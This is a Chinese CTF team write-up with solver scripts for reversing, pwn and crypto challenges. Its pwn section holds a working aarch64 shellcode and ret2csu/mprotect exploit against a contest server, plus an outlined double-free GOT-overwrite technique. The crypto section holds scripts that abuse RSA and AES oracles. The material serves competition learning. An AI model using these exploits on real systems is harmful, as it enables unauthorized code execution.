骇极杯writeup
=======
sixstars
## 签到
base32解码

## reverse
### easy_py
  反编译pyc文件，使用多种途径都不行。无奈，只能从底往上逆。使用[pycdc](git@github.com:zrax/pycdc.git)。若想得到汇编代码，先改二进制文件，将3323改为0000，反汇编的时候就不会报错，如下：
  
```
        0       JUMP_ABSOLUTE           6
        3       LOAD_CONST              0: 0
        6       JUMP_ABSOLUTE           9
        9       LOAD_CONST              0: 0
        12      LOAD_CONST              1: 10
        15      LOAD_CONST              2: 7
        18      LOAD_CONST              3: 1
        21      LOAD_CONST              4: 29
        24      LOAD_CONST              5: 14
        27      LOAD_CONST              2: 7
        30      LOAD_CONST              6: 22
        33      LOAD_CONST              6: 22
        36      LOAD_CONST              7: 31
        39      LOAD_CONST              8: 57
        42      LOAD_CONST              9: 30
        45      LOAD_CONST              10: 9
        48      LOAD_CONST              11: 52
        51      LOAD_CONST              12: 27
        54      BUILD_LIST              15
        57      STORE_NAME              0: cmp
        60      LOAD_NAME               1: raw_input
        63      CALL_FUNCTION           0
        66      STORE_NAME              2: flag
        69      LOAD_CONST              0: 0
        72      STORE_NAME              3: m                                                                       
        75      SETUP_LOOP              91 (to 169)
        78      LOAD_NAME               2: flag
        81      GET_ITER
        82      FOR_ITER                83 (to 168)
        85      STORE_NAME              4: i
        88      LOAD_NAME               5: ord
        91      LOAD_NAME               4: i
        94      CALL_FUNCTION           1
        97      UNARY_INVERT
        98      LOAD_CONST              13: 102
        101     BINARY_AND
        102     LOAD_NAME               5: ord
        105     LOAD_NAME               4: i
        108     CALL_FUNCTION           1
        111     LOAD_CONST              18: -103
        114     BINARY_AND
        115     BINARY_OR
        116     STORE_NAME              4: i
        119     LOAD_NAME               4: i
        122     LOAD_NAME               0: cmp
        125     LOAD_NAME               3: m
        128     BINARY_SUBSCR
        129     COMPARE_OP              2 (==)
        132     POP_JUMP_IF_FALSE       144
        135     LOAD_NAME               3: m
        138     UNARY_NEGATIVE
        139     LOAD_CONST              14: -1
        142     BINARY_ADD
        143     UNARY_NEGATIVE
        144     STORE_NAME              3: m
        147     JUMP_ABSOLUTE           73
        150     JUMP_ABSOLUTE           73
        153     LOAD_CONST              15: 'wrong'
        156     PRINT_ITEM
        157     PRINT_NEWLINE
        158     LOAD_NAME               6: exit
        161     CALL_FUNCTION           0
        164     POP_TOP
        165     JUMP_ABSOLUTE           73
        168     POP_BLOCK
        169     LOAD_CONST              16: 'right'
        172     PRINT_ITEM
        173     PRINT_NEWLINE
        174     LOAD_CONST              17: None
        177     RETURN_VALUE
```
发现，将输入的flag中的每一个char记为i，程序判断(~i&102)|(i&-103)是否和cmp对应位置的数字相等,解题脚本如下：
```python
arr = [0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]
flag = ""
for j in range(len(arr)):
     for i in range(256):
         if (~i&102)|(i&-103)==arr[j]:
             flag+=chr(i)
print flag
```

### cyvm

用ida反编译程序，发现vm的指令集如下：
ins = [0x0F,0x10,0x14,0x20,0x10,0x16,0x00,0x09,0x24,0x02,
       0x15,0x16,0xE9,0x12,0x16,0xE8,0x02,0x17,0x16,0x13,
       0x16,0x90,0x06,0x15,0x17,0x45,0x06,0x15,0x16,0x76,
       0x01,0x15,0x16,0x12,0x16,0xFF,0x0A,0x14,0x16,0x0C,
       0x09,0x0E]
然后，跟着程序一步一步执行，发现大体逻辑是先初始化两个变量，然后就进入一个循环，循环结束后，判断s字符串是否和s2相等，如果相等，则s即为我们要找的flag。
循环执行的逻辑是
```
v9=0
while v9<=0x20:
    v8=s[v9]
    v9++
    v10=s[v9]
    v9--
    v8^=v10
    v8^=v9
    s[v9]=v8
    v9++
```

解题代码为：
```python
s2 = [0x0A,0x0C,0x04,0x1F,0x48,0x5A,0x5F,0x03,0x62,0x67,0x0E,0x61,0x1E,0x19,0x08,0x36,0x47,0x52,0x13,0x57,0x7C,0x39,0x54,0x4B,0x05,0x05,0x45,0x77,0x15,0x26,0x0E,0x62]

flag = [0]*0x21
length = len(s2)
i = length-1

while i>=0:
   x = s2[i]^i^flag[i+1]
   flag[i]=x
   i-=1

print ''.join([chr(x) for x in flag])
```

### what's_it
题目一开始让爆破六子节md5，并用md5前后四位用作种子解码check函数，爆破脚本,爆破出来的字符串如下`ozulmt:0ec448d42dbf0000c020c0000048010e`
。通过后四位做种子生成随机数程序,必须在window下执行
```
#include <stdio.h>
#include <stdlib.h>
int main(){
    srand(246);
    for(int i=0;i<0x132;i++){
        printf("%d\n",rand());
    }
}

```
使用ida进行patch
```
from pool import array
begin=0x00402626
for i in range(0x132):
    tmp=(array[i]&0xff)^Byte(i+begin)
    PatchByte(i+begin,tmp)
```
进入check函数后逻辑很简单，使用前四位做种子得到ascii索引矩阵，检查和输入是否相等
```
#include <stdio.h>
#include <stdlib.h>
const char *ptr="0123456789abcdef";
int main(){
    srand(300);
    char tmp[0x21]={0};
    for(int i=0;i<0x20;i++){
        tmp[i]=ptr[rands(0x10)];
    }
    puts(tmp);
}

```
最终结果`flag{a197b847-7092-53a4-7c41-bc7d6d52e69d}`

### cpp
程序一直在做字符的比特位变换，相当无聊，解题脚本如下
```

s=['']*0x20
s[0] = 0x99
s[1] = 0xB0
s[2] = -121
s[3] = -98
s[4] = 112
s[5] = -24
s[6] = 65
s[7] = 68
s[8] = 5
s[9] = 4
s[10] = -117
s[11] = -102
s[12] = 116
s[13] = -68
s[14] = 85
s[15] = 88
s[16] = 0xB5
s[17] = 97
s[18] = -114
s[19] = 54
s[20] = -84
s[21] = 9
s[22] = 89
s[23] = -27
s[24] = 97
s[25] = -35
s[26] = 62
s[27] = 63
s[28] = -71
s[29] = 21
s[30] = -19
s[31] = -43

s=map(lambda x:x&0xff,s)
print "1"
print s
for _ in range(0x4):
    for i in range(0x20-1,0,-1):
        s[i]=s[i]^s[i-1]
print "2"
print s
for i in range(0x20):
    s[i]^=i
    s[i]=((s[i]>>2)&0xff)|((s[i]<<6)&0xff)

print "3"
print "".join(map(chr,s))
```

## pwn
### baby_arm
arm架构的栈溢出。一开始先可以写bss，写上shellcode，然后想栈溢出直接跳转到bss，因为发现本地qemu执行时并没有开nx。但是远程这样并不行，执行会报错，并且把错误信息打出`./qemu-... -nx pwn...` 自己的qemu好像并没有这功能，不知道是不是主办方自己给qemu打了patch。刚好又发现程序里有一个mprotect函数，利用ret2csu调用mprotec把bss变成可执行段，然后正常执行shellcode。

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./pwn"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=remote("127.1",20001)
else:
    r=remote("106.75.126.171",33865)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

code="""
    mov    x8, SYS_execve
    mov    x2, xzr           // NULL
    mov    x1, xzr           // NULL
    BL    here
    .ascii "/bin/sh"
    .byte 0x0 
here:
    mov    x0,x30
    svc    0
"""
import string
sh=asm(code,arch="aarch64")
r.sendafter("Name:",sh+p64(0x400860))
f={
        0:p64(0)+p64(1),
        0x10:p64(0x411068+len(sh))+p64(0x7),
        0x20:p64(0x1000)+p64(0x411000),
        0x30:p64(0x40f500)+p64(0x4007D4),
}
r.send("a"*0x48+p64(0x4008CC)+p64(0x40f500)+p64(0x4008AC)+fit(f)+"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRST"+p64(0x411068))
r.interactive()
```
### mono_server
比赛后才写出来。
由于delete的时候会延时一秒free，所以可以race出double free出来。 但是libc又不好leak，思路如下
- 先double free出0x40的chunk用来在got上申请假chunk，这时候因为没有libc的地址，所以留着一个double free备用  
- 将数组清空，然后double free出0x30的chunk，伪造chunk改临近name指针，leak出got表
- 利用0x40的堆块修改atoi的got表为system


## crypto

### rsaaaaa

题目给了源码，发现需要玩两个小游戏：
也就是两个函数
```python
def tell_n_d():
    e, d, n, m, c = rsa_gen()

    print_output("Give you a message:0x%x\nand its ciphertext:0x%x" % (m, c))
    print_output("Please give me the private key to decrypt cipher")
    print_output("n:")
    N = int(raw_input().strip())
    print_output("d:")
    D = int(raw_input().strip())
    if not pow(c, D, N) == m:
        exit(1)
    print_output("Oh, how you know the private key!")
    return m
    

def number_theory():
    while True:
        e, d, n, m, c = rsa_gen()
        print_output("n=0x%x\ne=0x%x\nc=0x%x\n" % (n, e, c))
        print_output("Now, you have a chance to decrypt something(but no c):")
        C = int(raw_input().strip())
        if C == c:
            print_output("Nonono~")
            continue
        M = pow(C, d, n)
        print_output("message:0x%x" % M)
        print_output("Give me right message:")
        MM = int(raw_input().strip())
        if not MM == m:
            exit(1)
        print_output("Master in math!")
        return m
```

对于第一个函数只需要
$$d = 1$$
$$n = c-m$$
对于第二个函数只需要
$$inv = invert(c,n)$$
在通过加密机会加密
$$inv^d = c_i mod n$$
在求 inv^d 关于n的逆元即可
也就是：
m*inv^d = 1 mod n
求出来两个msg 也就是求出来了flag下面是脚本

```python

from pwn import *
from pwnlib.util.iters import bruteforce
import hashlib
context.log_level="debug"

def hash(x):
    return hashlib.sha512(x).hexdigest()

r=remote("106.75.101.197",7544)
r.recvuntil("sha512(")
prefix=r.recvuntil("+")[:-1]
r.recvuntil("== ")
result=r.recvline()[:-1]
x=bruteforce(lambda x:hash(prefix+x)==result,string.ascii_letters+string.digits,length=4,method='downfrom')
r.sendline(x)
r.recvuntil("age:")
msg1=int(r.recvline()[:-1],16)
m=msg1
r.recvuntil("text:")
c=int(r.recvline()[:-1],16)
r.sendlineafter("n:",str(c-m))
r.sendlineafter("d:","1")
r.recvuntil("n=")

n=int(r.recvline(),16)
r.recvuntil("e=")
e=int(r.recvline(),16)
r.recvuntil("c=")
c=int(r.recvline(),16)

import gmpy2
x=gmpy2.invert(c,n)
r.sendline(str(x))
r.recvuntil("message:")
msg=int(r.recvline(),16)
msg2=gmpy2.invert(msg,n)
r.sendline(str(msg2))
r.recvuntil("flag:")
flag=r.recvline()[:-1][2:].decode("hex")

from Crypto.Cipher import AES
cipher = AES.new(hex(msg2)[2:].decode("hex"), AES.MODE_CBC, hex(msg1)[2:].decode("hex"))
print cipher.decrypt(flag)

r.interactive()

```

### Aesssss
题目给了源码，尝试过以后我们知道，可以通过2操作来修改flag
由于flag是33位的我们有这个一个数组：
```python
['\xff','\xfe','\xfd','\xfc','\xfb','\xfa','
\xf9','\xf8','\xf7','\xf6','\xf5','\xf4','\xf3','\xf2','\xf1','\xf0','\xef','\xee','\xed','\xec','\xeb','\xea','\xe9','\xe8','\xe7','\xe6','\xe5','\xe4','\xe3','\xe2','\xe1','\xe0','\xdf']
```
这个数组每次都乘以223发过去，第二次在什么都不写发过去，得到的padingflag就可以自己控制，每次显示一位的flag的值，通过每次256次爆破，爆破33次即拿到flag

下面是最后一次成功爆破的源码：

```python
from pwn import *
from pwnlib.util.iters import bruteforce
import hashlib
context.log_level="debug"


def hash(x):
    return hashlib.sha256(x).hexdigest()

r=remote("106.75.13.64",54321)
r.recvuntil("sha256(XXXX+")
prefix=r.recvuntil(")")[:-1]
# print prefix
r.recvuntil("== ")
result=r.recvline()[:-1]
# print result
x=bruteforce(lambda x:hash(x+prefix)==result,string.ascii_letters+string.digits,length=4,method='downfrom')
r.sendline(x)

padding = '\xdf'*223
empty = ''

r.recvuntil("Your choice:")
r.sendline('2')
r.recvuntil("Pad me something:")
r.sendline(padding)

r.recvuntil("Your choice:")
r.sendline('2')
r.recvuntil("Pad me something:")
r.sendline(empty)

r.recvuntil("Your choice:")
r.sendline('1')
r.recvuntil('flag: ')
ct = r.recvline()[:-1]
print ct

x = '\xdf'*256
y = 'flag{H4ve_fun_w1th_p4d_and_unp4d'
for i in range(256):
    r.recvuntil("Your choice:")
    r.sendline('3')
    r.recvuntil('What do you want to encrypt:')
    
    x = y+chr(i)+x[32:]
    # print x
    r.sendline(x)
    r.recvuntil('Here is the encrypted message: ')
    message = r.recvline()[:-1]
    print message
    if message == ct:
        print 'right!!'
        print (i,chr(i))
        break
    else:
        print 'wrong!!!!!'


# for i in range(256):
#     r.recvuntil("Your choice:")
#     r.sendline('3')
#     r.recvuntil('What do you want to encrypt:')
#     x ='\xff'*98+ chr(i)+'\xff'*(256-100)
#     # print x
#     r.sendline(x)
#     r.recvuntil('Here is the encrypted message: ')
#     message = r.recvline()[:-1]
#     print message
#     if message == ct:
#         print 'right!!'
#         print chr(i)
#         break
#     else:
#         print 'wrong!!!!!'
          
# flag
r.interactive()





```